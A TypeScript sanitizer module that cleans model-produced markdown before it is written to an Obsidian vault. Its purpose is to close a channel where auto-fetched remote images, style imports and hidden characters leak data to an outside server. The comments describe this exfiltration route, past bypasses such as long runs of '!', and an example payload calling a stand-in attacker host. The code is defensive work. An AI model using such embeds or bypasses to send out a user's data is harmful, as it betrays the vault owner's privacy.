/**
 * Write-path sanitizer: closes the remote-image exfiltration channel and
 * refuses invisible payloads (ARCHITECTURE.md §5.3, item 2: the Obsidian
 * client auto-fetches remote images when the owner opens a note, carrying
 * data out in the query string — so an embed must never survive a write).
 *
 * De-embedding turns an auto-fetching image into an ordinary link: the URL
 * stays visible and clickable, but nothing is fetched without a human act.
 *
 * Two structural rules, learned from real bypasses:
 * - every transformation reaches its fixpoint in ONE pass (a whole run of
 *   leading `!` is neutralized at once, not one `!` per pass), so the pass
 *   cap is never what decides whether the content is safe;
 * - if the loop still ends with something hostile in the content, the
 *   report comes back with a non-empty `blocked` list and the caller MUST
 *   refuse the write rather than persist half-sanitized content.
 */

import type { ParsedTag } from './html.js';
import {
  elementEnd,
  findRemoteUrl,
  isRemoteUrl,
  nextTag,
  normalizeUrl,
  remoteUrlInStyle,
  stripObsidianComments,
} from './html.js';
import type { SanitizationReport } from './invisible.js';
import { plural, stripInvisibleChars, stripTagBlockChars } from './invisible.js';

/**
 * Inline markdown image: `![alt](target)`, capturing the WHOLE run of
 * leading `!`. Capturing the run is what makes de-embedding terminal:
 * dropping a single `!` from `!!!!![a](url)` just re-creates an image, so
 * an N-bang prefix used to need N passes and 33 bangs beat the pass cap,
 * leaving a live remote embed on disk.
 *
 * `[^)]*` means a literal `)` inside a quoted title ends the match early —
 * a known v1 limitation that only makes stripping more conservative for
 * local images and never lets a remote URL through (the URL portion
 * precedes any title).
 */
const INLINE_IMAGE_RE = /(!+)\[([^\]]*)\]\(([^)]*)\)/g;

/** Reference-style image usage: `![alt][ref]` (including collapsed `![alt][]`). */
const REFERENCE_IMAGE_RE = /(!+)\[(?!\[)([^\]]*)\]\[([^\]]*)\]/g;

/**
 * Shorthand reference image: `![alt]` not followed by `(` or `[`.
 * `(?!\[)` right after the bang run leaves Obsidian wikilink embeds
 * `![[note]]` alone — those are local by construction and must survive
 * untouched.
 */
const SHORTHAND_IMAGE_RE = /(!+)\[(?!\[)([^\]]*)\](?![([])/g;

/** HTML elements the client fetches on its own. */
const FETCH_VECTOR_TAGS: ReadonlySet<string> = new Set([
  'img',
  'source',
  'video',
  'audio',
  'iframe',
  'embed',
  'object',
  'link',
]);

/** Attributes that can carry a fetchable URL on those elements. */
const URL_ATTRS = ['src', 'href', 'data', 'srcset', 'poster', 'background'];

/** Extract the URL portion of an inline image target (drop `<>` and title). */
function targetUrl(target: string): string {
  const t = target.trim();
  if (t.startsWith('<')) {
    const end = t.indexOf('>');
    return end === -1 ? t.slice(1) : t.slice(1, end);
  }
  return t.split(/\s+/, 1)[0] ?? '';
}

/**
 * Percent-encode the characters that would let a reported URL re-form
 * markdown structure inside the placeholder (`![x](…)`, `[x][y]`).
 */
function displayUrl(url: string): string {
  return url.replace(/[[\]()!`<>]/g, (c: string) => {
    const code = c.charCodeAt(0).toString(16).toUpperCase().padStart(2, '0');
    return `%${code}`;
  });
}

/**
 * The remote URL that makes this tag a fetch vector, if any.
 *
 * Everything here is decided on the parsed tag, so an unpaired quote can no
 * longer make a tag invisible to the sanitizer, and a fetch-vector tag that
 * merely *mentions* a remote address is removed even when the address is
 * not in a recognized attribute — unparseable means hostile, never skipped.
 */
function fetchVectorUrl(tag: ParsedTag): string | undefined {
  // `style="background:url(https://…)"` fetches on ANY element, and so does
  // the legacy `background` attribute.
  const style = tag.attrs.get('style');
  if (style !== undefined) {
    const styleUrl = remoteUrlInStyle(style);
    if (styleUrl !== undefined) return styleUrl;
  }

  if (!FETCH_VECTOR_TAGS.has(tag.name)) return undefined;

  for (const attr of URL_ATTRS) {
    const value = tag.attrs.get(attr);
    if (value === undefined) continue;
    if (attr === 'srcset') {
      // srcset is a comma-separated list of "url [descriptor]" candidates.
      for (const candidate of value.split(',')) {
        const url = candidate.trim().split(/\s+/, 1)[0] ?? '';
        if (isRemoteUrl(url)) return normalizeUrl(url);
      }
      continue;
    }
    if (isRemoteUrl(value)) return normalizeUrl(value);
  }

  return findRemoteUrl(tag.raw);
}

interface PassResult {
  content: string;
  count: number;
}

/** Elements whose CONTENT — not an attribute — can fetch a remote resource. */
const SCRIPT_STYLE_TAGS: ReadonlySet<string> = new Set(['script', 'style']);

/**
 * Neutralize `<script>`/`<style>` elements whose content references a remote
 * URL. The payload lives between the tags, so the attribute scan above cannot
 * see it: a written `<style>@import url(https://attacker/?d=…)` is fetched by
 * the owner's client exactly like a remote `<img>`, which would reopen the
 * exfiltration channel the write sanitizer exists to close. Elements that
 * reference only local resources are left untouched.
 */
function replaceRemoteScriptStyle(input: string): PassResult {
  let out = '';
  let cursor = 0;
  let pos = 0;
  let count = 0;
  for (;;) {
    const tag = nextTag(input, pos);
    if (!tag) break;
    if (!SCRIPT_STYLE_TAGS.has(tag.name)) {
      pos = tag.start + 1;
      continue;
    }
    const end = elementEnd(input, tag);
    const element = input.slice(tag.start, end);
    const content = input.slice(tag.end, end);
    const url =
      (tag.name === 'style' ? remoteUrlInStyle(content) : undefined) ??
      findRemoteUrl(element);
    if (url === undefined) {
      pos = tag.end;
      continue;
    }
    out += input.slice(cursor, tag.start);
    out += `[external content removed: ${displayUrl(url)}]`;
    count += 1;
    cursor = end;
    pos = end;
  }
  out += input.slice(cursor);
  return { content: out, count };
}

/** Replace every tag that would make the client fetch something remote. */
function replaceFetchVectors(input: string): PassResult {
  let out = '';
  let cursor = 0;
  let pos = 0;
  let count = 0;
  for (;;) {
    const tag = nextTag(input, pos);
    if (!tag) break;
    const url = fetchVectorUrl(tag);
    if (url === undefined) {
      // Rescan from inside the tag: a vector can hide in an attribute value.
      pos = tag.start + 1;
      continue;
    }
    out += input.slice(cursor, tag.start);
    out += `[external content removed: ${displayUrl(url)}]`;
    count += 1;
    cursor = tag.end;
    pos = tag.end;
  }
  out += input.slice(cursor);
  return { content: out, count };
}

interface WriteCounts {
  remoteImages: number;
  dataImages: number;
  referenceImages: number;
  htmlVectors: number;
  obsidianComments: number;
  invisibleChars: number;
  tagBlockChars: number;
}

function emptyCounts(): WriteCounts {
  return {
    remoteImages: 0,
    dataImages: 0,
    referenceImages: 0,
    htmlVectors: 0,
    obsidianComments: 0,
    invisibleChars: 0,
    tagBlockChars: 0,
  };
}

/**
 * One structural pass. Invisible characters go first so an embed spliced
 * together with zero-width characters is de-embedded in the same pass that
 * reveals it.
 */
function writePass(input: string): { content: string; counts: WriteCounts } {
  const counts = emptyCounts();

  const inv = stripInvisibleChars(input);
  counts.invisibleChars = inv.count;
  const tags = stripTagBlockChars(inv.content);
  counts.tagBlockChars = tags.count;

  const obsidian = stripObsidianComments(tags.content);
  counts.obsidianComments = obsidian.count;
  let content = obsidian.content;

  // 0. `<script>`/`<style>` elements fetch from their content, not an
  //    attribute. Neutralize remote ones first so a splice they leave is
  //    caught by the image and tag scans below in the same pass.
  const scriptStyle = replaceRemoteScriptStyle(content);
  content = scriptStyle.content;

  // 1. Inline images: de-embed remote, strip data:, leave local untouched.
  content = content.replace(
    INLINE_IMAGE_RE,
    (full: string, bangs: string, alt: string, target: string) => {
      const url = targetUrl(target);
      if (isRemoteUrl(url)) {
        counts.remoteImages += 1;
        // Drop the whole bang run: URL and title survive as a link.
        return full.slice(bangs.length);
      }
      if (/^data:/i.test(normalizeUrl(url))) {
        // data: URIs can smuggle payloads; drop the URI, keep the alt text.
        counts.dataImages += 1;
        return `[${alt}]`;
      }
      return full; // local / vault-relative image: untouched
    },
  );

  // 2. Reference-style usages: whether the definition is remote cannot be
  //    decided locally, and de-embedding is harmless for local refs.
  content = content.replace(
    REFERENCE_IMAGE_RE,
    (_full: string, _bangs: string, alt: string, ref: string) => {
      counts.referenceImages += 1;
      return `[${alt}][${ref}]`;
    },
  );
  content = content.replace(
    SHORTHAND_IMAGE_RE,
    (_full: string, _bangs: string, alt: string) => {
      counts.referenceImages += 1;
      return `[${alt}]`;
    },
  );

  // 3. HTML fetch-vectors pointing at remote content. Only the tag itself
  //    is replaced (spec: "replace tag"); a container's inner fallback text
  //    stays visible, which is harmless once the fetching tag is gone.
  const vectors = replaceFetchVectors(content);
  counts.htmlVectors = vectors.count + scriptStyle.count;

  return { content: vectors.content, counts };
}

function describe(counts: WriteCounts): string[] {
  const removed: string[] = [];
  if (counts.remoteImages > 0) {
    removed.push(
      `de-embedded ${counts.remoteImages} remote ${plural(counts.remoteImages, 'image')}`,
    );
  }
  if (counts.dataImages > 0) {
    removed.push(
      `removed ${counts.dataImages} data: ${plural(counts.dataImages, 'image')}`,
    );
  }
  if (counts.referenceImages > 0) {
    removed.push(
      `de-embedded ${counts.referenceImages} reference-style ${plural(counts.referenceImages, 'image')}`,
    );
  }
  if (counts.htmlVectors > 0) {
    removed.push(
      `replaced ${counts.htmlVectors} HTML ${plural(counts.htmlVectors, 'element')} referencing remote content`,
    );
  }
  if (counts.obsidianComments > 0) {
    removed.push(
      `removed ${counts.obsidianComments} Obsidian ${plural(counts.obsidianComments, 'comment')}`,
    );
  }
  if (counts.invisibleChars > 0) {
    removed.push(
      `removed ${counts.invisibleChars} invisible ${plural(counts.invisibleChars, 'character')}`,
    );
  }
  if (counts.tagBlockChars > 0) {
    removed.push(
      `removed ${counts.tagBlockChars} Unicode tag-block ${plural(counts.tagBlockChars, 'character')}`,
    );
  }
  return removed;
}

/** Report for the write path. */
export interface WriteSanitizationReport extends SanitizationReport {
  /**
   * Non-empty means the content could NOT be made safe: the caller must
   * refuse the write instead of persisting `content`. Empty is the normal
   * case — the sanitizer neutralizes, it does not block.
   */
  blocked: string[];
}

export interface SanitizedWriteContent {
  content: string;
  report: WriteSanitizationReport;
}

/** Safety valve. Exposed only so tests can exercise the give-up path. */
export interface WriteSanitizeOptions {
  maxPasses?: number;
}

const MAX_PASSES = 32;

/**
 * Sanitize model-produced content before it is written to the vault.
 *
 * Runs to a fixpoint because one pass is not always enough against
 * splicing: a replacement can uncover a new construct at its junction. Each
 * pass strictly reduces the content (or replaces a tag with an inert
 * placeholder), so the loop terminates and
 * sanitize(sanitize(x)) === sanitize(x).
 *
 * The cap is a guard against pathological input, not a correctness
 * requirement — and it is never allowed to decide safety silently: if the
 * loop ends without a fixpoint, the detectors run once more and whatever
 * still matches is reported in `report.blocked` for the caller to refuse.
 */
export function sanitizeForWrite(
  markdown: string,
  options: WriteSanitizeOptions = {},
): SanitizedWriteContent {
  const maxPasses = options.maxPasses ?? MAX_PASSES;
  const total = emptyCounts();
  let content = markdown;
  let converged = false;

  for (let pass = 0; pass < maxPasses; pass += 1) {
    const result = writePass(content);
    total.remoteImages += result.counts.remoteImages;
    total.dataImages += result.counts.dataImages;
    total.referenceImages += result.counts.referenceImages;
    total.htmlVectors += result.counts.htmlVectors;
    total.obsidianComments += result.counts.obsidianComments;
    total.invisibleChars += result.counts.invisibleChars;
    total.tagBlockChars += result.counts.tagBlockChars;
    const changed = result.content !== content;
    content = result.content;
    if (!changed) {
      converged = true;
      break;
    }
  }

  const blocked: string[] = [];
  if (!converged) {
    // Re-run the detectors on the final text and discard their output: what
    // matters is only whether anything hostile is still in there.
    const check = writePass(content);
    if (check.content !== content) {
      blocked.push(
        `content still hostile after ${maxPasses} sanitizer passes ` +
          `(${describe(check.counts).join('; ')})`,
      );
    }
  }

  return { content, report: { removed: describe(total), blocked } };
}
